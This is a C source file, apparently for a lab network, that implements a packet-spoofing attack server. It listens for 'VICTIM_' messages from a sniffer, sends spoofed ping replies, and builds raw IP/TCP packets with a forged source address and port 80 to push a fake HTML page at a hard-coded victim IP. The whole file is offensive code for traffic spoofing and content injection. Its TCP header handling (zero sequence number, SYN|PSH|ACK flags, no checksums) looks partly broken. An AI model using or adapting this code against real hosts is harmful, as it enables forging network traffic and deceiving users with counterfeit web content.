#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <time.h>
#include <errno.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>

#define PORT 9090
#define BUFFER_SIZE 1024
#define CLIENT_PORT 8081
#define LOCAL_SERVER_HOST "172.20.0.104"
#define VICTIM_IP "172.20.0.102"
#define INDEX_HTML_PATH "./index.html"
#define MAX_HTML_SIZE 4096

// HTTP response template
#define FAKE_RESPONSE "HTTP/1.1 200 OK\r\n" \
    "Content-Type: text/html\r\n" \
    "Content-Length: %lu\r\n" \
    "Connection: close\r\n\r\n%s"

// Function to read HTML file
char* read_html_file() {
    static char html_content[MAX_HTML_SIZE];
    FILE *fp = fopen(INDEX_HTML_PATH, "r");
    if (!fp) {
        printf("Error opening index.html: %s\n", strerror(errno));
        return NULL;
    }
    
    size_t bytes_read = fread(html_content, 1, MAX_HTML_SIZE - 1, fp);
    fclose(fp);
    
    if (bytes_read == 0) {
        printf("Error reading index.html\n");
        return NULL;
    }
    
    html_content[bytes_read] = '\0';
    return html_content;
}

void error(const char *msg) {
    perror(msg);
    exit(1);
}

void send_fake_response(const char *response, const char *victim_ip, int victim_port) {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0) {
        perror("socket creation failed");
        return;
    }

    struct sockaddr_in victim;
    memset(&victim, 0, sizeof(victim));
    victim.sin_family = AF_INET;
    victim.sin_port = htons(victim_port);
    victim.sin_addr.s_addr = inet_addr(victim_ip);

    // Set IP header
    char packet[MAX_HTML_SIZE + 512];
    struct iphdr *ip = (struct iphdr *)packet;
    struct tcphdr *tcp = (struct tcphdr *)(packet + sizeof(struct iphdr));
    
    // Fill IP header
    ip->version = 4;
    ip->ihl = 5;
    ip->tos = 0;
    ip->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + strlen(response);
    ip->id = htons(54321);
    ip->frag_off = 0;
    ip->ttl = 64;
    ip->protocol = IPPROTO_TCP;
    ip->check = 0;
    ip->saddr = inet_addr(LOCAL_SERVER_HOST);
    ip->daddr = victim.sin_addr.s_addr;
    
    // Fill TCP header with correct member names
    tcp->th_sport = htons(80);
    tcp->th_dport = victim.sin_port;
    tcp->th_seq = 0;
    tcp->th_ack = 0;
    tcp->th_off = 5;    // Data offset
    tcp->th_flags = TH_SYN | TH_PUSH | TH_ACK;  // Set flags using proper flags field
    tcp->th_win = htons(5840);
    tcp->th_sum = 0;    // Checksum
    tcp->th_urp = 0;    // Urgent pointer
    
    // Copy response data
    memcpy(packet + sizeof(struct iphdr) + sizeof(struct tcphdr), response, strlen(response));
    
    // Send packet
    if (sendto(sock, packet, ip->tot_len, 0, (struct sockaddr *)&victim, sizeof(victim)) < 0) {
        perror("sendto failed");
    }
    close(sock);
}

void handle_victim_request(const char *buffer, struct sockaddr_in *clientaddr, socklen_t len, int sockfd) {
    printf("\n[+] Processing request: %s\n", buffer);
    
    if (strstr(buffer, "VICTIM_PING") != NULL) {
        // Send fake ping response
        const char *response = "ICMP Echo Reply (Spoofed)";
        sendto(sockfd, response, strlen(response), 0, 
               (struct sockaddr *)clientaddr, len);
        printf("[+] Sent fake PING response\n");
    }
    else if (strstr(buffer, "VICTIM_HTTP") != NULL) {
        char *html_content = read_html_file();
        if (html_content) {
            char response[MAX_HTML_SIZE + 512];
            snprintf(response, sizeof(response),
                    "HTTP/1.1 200 OK\r\n"
                    "Server: Fake-Server\r\n"
                    "Content-Type: text/html\r\n"
                    "Content-Length: %lu\r\n"
                    "Connection: close\r\n"
                    "\r\n"
                    "%s",
                    strlen(html_content), html_content);
            
            // Extract client port from message if available
            int victim_port = 80;  // default
            if (sscanf(buffer, "VICTIM_HTTP from %*s to port %d", &victim_port) == 1) {
                send_fake_response(response, VICTIM_IP, victim_port);
                printf("[+] Sent fake webpage to %s:%d\n", VICTIM_IP, victim_port);
            }
        }
    }

    // Send acknowledgment to sniffer
    const char *ack = "ACK: Request processed";
    sendto(sockfd, ack, strlen(ack), 0, 
           (struct sockaddr *)clientaddr, len);
}

int main() {
    int sockfd;
    struct sockaddr_in servaddr, clientaddr, forwardaddr;
    char buffer[BUFFER_SIZE];
    socklen_t len;

    if ((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        error("Socket creation failed");
    }

    // Enable address reuse
    int optval = 1;
    if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval)) < 0) {
        error("setsockopt SO_REUSEADDR failed");
    }

    // Enable broadcast capability
    if (setsockopt(sockfd, SOL_SOCKET, SO_BROADCAST, &optval, sizeof(optval)) < 0) {
        error("setsockopt SO_BROADCAST failed");
    }

    memset(&servaddr, 0, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = INADDR_ANY;
    servaddr.sin_port = htons(PORT);

    if (bind(sockfd, (const struct sockaddr *)&servaddr, sizeof(servaddr)) < 0) {
        error("Bind failed");
    }

    printf("UDP server is running on port %d...\n", PORT);
    printf("Server IP: 0.0.0.0 (listening on all interfaces)\n");
    printf("Waiting for messages from sniffer...\n");
    fflush(stdout);  // Ensure output is displayed immediately

    while (1) {
        len = sizeof(clientaddr);
        printf("\nReady to receive data...\n");
        fflush(stdout);
        
        int n = recvfrom(sockfd, buffer, BUFFER_SIZE-1, 0, 
                        (struct sockaddr *)&clientaddr, &len);
        if (n < 0) {
            printf("Error receiving data: %s (errno: %d)\n", strerror(errno), errno);
            continue;
        }
        
        // Process received data
        buffer[n] = '\0';
        time_t now = time(NULL);
        char timestamp[64];
        strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", localtime(&now));
        
        printf("\n[%s] Received message from %s:%d\n", 
               timestamp, inet_ntoa(clientaddr.sin_addr), 
               ntohs(clientaddr.sin_port));
        printf("Message content (%d bytes): %s\n", n, buffer);
        fflush(stdout);

        // Handle message based on type
        if (strstr(buffer, "VICTIM_") != NULL) {
            handle_victim_request(buffer, &clientaddr, len, sockfd);
            printf("[*] Local Server: %s:%d\n", LOCAL_SERVER_HOST, PORT);
            printf("[*] Victim IP: %s\n", VICTIM_IP);
            fflush(stdout);
        } else {
            // Send acknowledgment
            const char *ack_msg = "Message received and processed by local server";
            if (sendto(sockfd, ack_msg, strlen(ack_msg), 0, 
                      (struct sockaddr *)&clientaddr, len) < 0) {
                perror("Error sending acknowledgment");
            } else {
                printf("Acknowledgment sent to sniffer\n");
            }
        }
    }  // end while

    close(sockfd);
    return 0;
}  // end main